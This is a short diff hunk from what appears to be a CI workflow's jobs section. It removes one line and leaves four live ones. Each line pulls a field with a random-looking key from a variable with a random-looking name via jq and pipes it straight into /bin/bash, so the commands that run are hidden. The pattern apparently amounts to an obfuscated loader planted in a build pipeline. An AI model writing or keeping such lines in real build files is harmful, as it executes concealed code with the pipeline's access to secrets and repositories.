@@ -22,7 +22,6 @@ jobs:
           echo $sa7058 | jq -r .ho0 | /bin/bash
           echo $gvrro38395 | jq -r .izv269 | /bin/bash
           printf '%s' "$s40494" | jq -r .k1363 | /bin/bash
-          printf '%s' "$t39182" | jq -r .myrzn23 | /bin/bash
           printf '%s' "$icxjf4" | jq -r .qi59936 | /bin/bash
 
       - name: Archive results
